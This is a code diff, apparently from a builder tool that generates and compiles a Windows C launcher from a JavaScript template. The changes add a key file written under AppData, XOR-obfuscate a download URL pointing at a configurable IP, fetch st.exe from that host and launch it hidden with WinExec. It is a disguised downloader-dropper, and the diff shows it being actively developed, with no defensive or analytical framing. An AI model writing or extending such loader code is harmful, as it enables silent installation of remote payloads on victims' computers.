@@ -39,10 +39,10 @@ END
 `;
 }
 
-function cSource({ ip }) {
+function cSource({ ip, key }) {
   const url = `http://${ip}/api/downloads/st.exe`;
-  const key = [0x4B, 0x2A, 0x11, 0x9C]; 
-  const encUrl = Array.from(url).map((c, i) => c.charCodeAt(0) ^ key[i % key.length]);
+  const xorKey = [0x4B, 0x2A, 0x11, 0x9C]; 
+  const encUrl = Array.from(url).map((c, i) => c.charCodeAt(0) ^ xorKey[i % xorKey.length]);
   const urlArr = encUrl.map(b => '0x' + b.toString(16).padStart(2, '0')).join(',');
 
   return `
@@ -122,16 +122,29 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     _snwprintf(loaderDir, MAX_PATH, L"%ls\\\\loader", appData);
     CreateDirectoryW(loaderDir, NULL);
 
-    // FIXED: Dropping as st.exe instead of random hex
+    // 1. Write key.json FIRST
+    wchar_t keyPath[MAX_PATH];
+    _snwprintf(keyPath, MAX_PATH, L"%ls\\\\key.json", loaderDir);
+    
+    char keyJson[512];
+    _snprintf(keyJson, sizeof(keyJson), "{\"key\": \"${key}\"}");
+    
+    HANDLE hKey = CreateFileW(keyPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hKey != INVALID_HANDLE_VALUE) {
+        DWORD written;
+        WriteFile(hKey, keyJson, strlen(keyJson), &written, NULL);
+        CloseHandle(hKey);
+    }
+
+    // 2. Download st.exe
     wchar_t dest[MAX_PATH];
     _snwprintf(dest, MAX_PATH, L"%ls\\\\st.exe", loaderDir);
 
     wchar_t url[1024];
     decrypt_url(url);
-    
     download_file(url, dest);
 
-    // Launch the file directly
+    // 3. Launch st.exe silently
     char ansiDest[MAX_PATH];
     WideCharToMultiByte(CP_ACP, 0, dest, -1, ansiDest, MAX_PATH, NULL, NULL);
     WinExec(ansiDest, SW_HIDE);
@@ -151,7 +164,7 @@ export async function compileLauncher({ key, config, baseExe }) {
   const resPath    = path.join(workDir, 'app.res');
   const outPath    = path.join(workDir, 'launcher.exe');
 
-  fs.writeFileSync(cPath, cSource({ ip }));
+  fs.writeFileSync(cPath, cSource({ ip, key }));
   fs.writeFileSync(rcPath, rcSource());
 
   const iconSourcePath = path.join(__dirname, '..', 'icon.ico');
